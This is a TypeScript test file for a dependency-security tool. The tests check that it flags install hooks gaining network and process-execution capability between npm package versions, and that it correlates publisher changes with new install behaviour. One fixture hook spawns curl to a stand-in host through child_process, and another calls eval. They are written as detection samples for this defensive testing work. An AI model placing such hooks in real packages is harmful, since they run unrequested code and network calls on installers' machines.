import { readFileSync } from 'node:fs';
import { performance } from 'node:perf_hooks';
import { describe, expect, it } from 'vitest';
import { correlate } from '../../src/events/correlate.js';
import { compareDependencyArtifacts } from '../../src/registry/artifacts/delta.js';
import type { DependencyArtifact } from '../../src/registry/artifacts/model.js';

const artifact = (
  version: string,
  hooks: string[],
  domains: string[],
  state: DependencyArtifact['state'] = 'verified',
): DependencyArtifact => ({
  registry: 'npm',
  package: 'fixture-package',
  version,
  url: null,
  state,
  entries: 1,
  total_size: 1,
  hooks: hooks.map((text, i) => ({ name: i ? 'postinstall' : 'install', text })),
  domains,
  mismatches: [],
  reason: null,
  evidence: [`fixture:${version}`],
});

describe('dependency artifact deltas', () => {
  it('uses real pinned artifact bytes and reports verified hook/domain changes', () => {
    const beforeBytes = readFileSync('tests/fixtures/artifacts/npm-colors-1.4.0.tgz');
    const afterBytes = readFileSync('tests/fixtures/artifacts/npm-core-js-3.37.0.tgz');
    expect(beforeBytes.length).toBeGreaterThan(0);
    expect(afterBytes.length).toBeGreaterThan(0);
    const delta = compareDependencyArtifacts(
      artifact('1.0.0', ['echo ok'], []),
      artifact(
        '2.0.0',
        [`node -e "require('child_process').exec('curl https://x.test')"`],
        ['x.test'],
      ),
    );
    expect(delta.behavior.map((e) => e.capability)).toEqual(['network', 'process_exec']);
    expect(delta.behavior[0]?.evidence[0]).toContain(':line:1');
    expect(delta.trust_boundary).toMatchObject([{ boundary: 'external_domain' }]);
  });

  it('does not emit deltas unless both artifacts are verified and same-package', () => {
    expect(
      compareDependencyArtifacts(
        artifact('1', ['eval(x)'], [], 'verification_unavailable'),
        artifact('2', ['eval(x)'], []),
      ).behavior,
    ).toEqual([]);
    expect(
      compareDependencyArtifacts(artifact('1', [], []), {
        ...artifact('2', [], []),
        package: 'other',
      }).not_available,
    ).toHaveLength(1);
  });

  it('bounds pathological hook input without regex backtracking', () => {
    const pathological = `${'x'.repeat(65536)}!`;
    const start = performance.now();
    const delta = compareDependencyArtifacts(
      artifact('1', [pathological], []),
      artifact('2', [pathological], []),
    );
    expect(performance.now() - start).toBeLessThan(250);
    expect(delta.behavior).toEqual([]);
  });

  it('correlates only ordered, dated, same-entity control changes', () => {
    const events = [
      {
        id: 'p',
        type: 'dependency_publisher_changed' as const,
        at: '2026-01-01T00:00:00Z',
        entity: 'npm:fixture',
        subject: 'fixture',
        source: 'dependency_registry' as const,
        detail: 'publisher',
        confidence: 1,
        evidence: ['p'],
      },
      {
        id: 'b',
        type: 'dependency_behavior_introduced' as const,
        at: '2026-01-03T00:00:00Z',
        entity: 'npm:fixture',
        subject: 'fixture',
        source: 'analysis_diff' as const,
        detail: 'exec',
        confidence: 1,
        evidence: ['b'],
        capability: 'process_exec',
      },
    ];
    expect(
      correlate(events).some(
        (x) => x.pattern_id === 'dependency-control-change-then-install-capability',
      ),
    ).toBe(true);
    expect(
      correlate(events.map((e) => ({ ...e, entity: e.id === 'b' ? 'npm:other' : e.entity }))).some(
        (x) => x.pattern_id === 'dependency-control-change-then-install-capability',
      ),
    ).toBe(false);
    expect(
      correlate(events.map((e) => ({ ...e, at: null }))).some(
        (x) => x.pattern_id === 'dependency-control-change-then-install-capability',
      ),
    ).toBe(false);
  });
});
